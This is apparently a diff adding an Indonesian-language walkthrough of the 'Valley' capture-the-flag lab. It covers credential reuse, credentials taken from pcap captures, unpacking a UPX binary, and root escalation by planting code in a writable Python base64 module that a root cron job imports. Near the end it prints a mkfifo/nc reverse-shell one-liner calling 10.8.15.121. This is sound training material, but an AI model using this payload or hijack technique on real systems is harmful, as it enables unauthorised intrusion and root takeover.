@@ -1,0 +1,89 @@
+dapat di /static/00
+```
+dev notes from valleyDev:
+-add wedding photo examples
+-redo the editing on #4
+-remove /dev1243224123123
+-check for SIEM alerts
+```
+
+lihat page source, lalu dapat ini http://valley.thm/dev1243224123123/dev.js
+```
+...
+loginButton.addEventListener("click", (e) => {
+    e.preventDefault();
+    const username = loginForm.username.value;
+    const password = loginForm.password.value;
+
+    if (username === "siemDev" && password === "california") {
+        window.location.href = "/dev1243224123123/devNotes37370.txt";
+    } else {
+        loginErrorMsg.style.opacity = 1;
+    }
+})
+```
+setelah login, dapat notes lagi
+```
+dev notes for ftp server:
+-stop reusing credentials
+-check for any vulnerabilies
+-stay up to date on patching
+-change ftp port to normal port
+```
+
+bisa dicoba untuk login ftp, dan creds nya sama. Kita dapat 3 file
+```
+siemFTP.pcapng
+siemHTTP1.pcapng
+siemHTTP2.pcapng
+```
+
+dapat creds lagi di siemHTTP2.pcapng, set filter http
+```
+uname : valleyDev
+pass : ph0t0s1234
+```
+kita bisa coba creds tersebut untuk login ssh. dan bisa.
+
+selanjutnya kita dapat binary file di `/home/valleyAuthenticator`, kita tidak bisa langsung reverse engineer, kita perlu decompress dulu karena ini compressed binary (bisa cek strings | grep UPX), decompress dengan cara `upx -d valleyAuthenticator`, lalu cari strings "username", dan kita mendapat ini
+```
+e6722920bab2326f8217e4bf6b1b58ac
+dd2921cc76ee3abfd2beb60709056cfb
+
+liberty123
+valley
+```
+karena kita mendapat creds lagi, dan kebetulan terdapat user valley di `/home` kita bisa creds tersebut, dan ternyata bisa. Selanjutnya kita cek pada user valley, tidak ada suid/guid yang bisa digunakan, tidak ada file yang mencurigakan juga. tapi, jika kita cek `/etc/crontab`, kita akan mendapatkan
+```
+...
+1  *    * * *   root    python3 /photos/script/photosEncrypt.py
+```
+
+lalu jika kita cek isinya, adalah
+```
+#!/usr/bin/python3
+import base64
+for i in range(1,7):
+# specify the path to the image file you want to encode
+        image_path = "/photos/p" + str(i) + ".jpg"
+
+# open the image file and read its contents
+        with open(image_path, "rb") as image_file:
+          image_data = image_file.read()
+
+# encode the image data in Base64 format
+        encoded_image_data = base64.b64encode(image_data)
+
+# specify the path to the output file
+        output_path = "/photos/photoVault/p" + str(i) + ".enc"
+
+# write the Base64-encoded image data to the output file
+        with open(output_path, "wb") as output_file:
+          output_file.write(encoded_image_data)
+```
+kita bisa cek apakah library `base64` python writeable dengan cara `locate base64`, lalu kita mendapat beberapa hasil, dan salah satunya adalah `/usr/lib/python3.8/base64.py`, jika kita cek, ternyata writeable ole grup `valleyAdmin`, dan user valley kita masuk grup tersebut. kita tambahkan isinya 
+```
+import os
+os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.15.121 2222 >/tmp/f')
+```
+selanjutnya save, dan kita siapkan listener, dan kita akan mendapat root shell.
